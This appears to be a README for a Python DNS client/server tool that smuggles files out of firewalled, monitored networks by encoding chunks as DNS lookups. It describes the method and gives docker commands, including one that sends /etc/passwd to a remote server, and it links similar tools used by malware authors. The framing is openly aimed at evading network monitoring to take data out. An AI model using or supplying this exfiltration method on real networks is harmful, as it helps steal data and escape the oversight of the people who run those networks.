# Send files over DNS

Data exfiltration out of a tightly monitored and firewalled network can be *tricky*.

**UDP/53 has entered the chat**

DNS queries are often overlooked by network administrators when filtering outgoing
network traffic. Here you'll find a simple python DNS client/server impl for sending
files.

# How it works

The client will cut the file to be sent into chunks and then encode each of those
chunks (in base58 for DNS Label friendliness). Each of these encoded chunks is
sent to the custom DNS server as domain name lookup. The server just takes the
chunks, decoded them, and reassembles them into the original file.

# How to build and execute with docker

```
docker build --tag dns_server .

# run the server:
docker run -p 53:8053 \
           -v /tmp/data:/data \
           --rm -ti dns_server

# run the client - send /etc/passwd to the server:
docker run --env TRANSFER_IO_NAMESERVER=192.168.1.101 \
           --env TRANSFER_IO_NAMESERVER_PORT=53 \
           --rm -ti dns_server python client.py /etc/passwd
```

Be sure to set the ip/ports to match your network setup.

The volume map on the server is where you'll find the decoded files sent to the server.
Their names will still be b58 encoded.

### Related work

After experiencing the momentary high of discovering this myself, I
figured that I wouldn't have been the first to discover this.
Indeed, I was not.
Apparently malware writers have been using similar techniques for years.
Here are a list of similar tools:

- [DNScat](http://tadek.pietraszek.org/projects/DNScat/)
- [DNSMessager](https://thehackernews.com/2017/03/powershell-dns-malware.html)


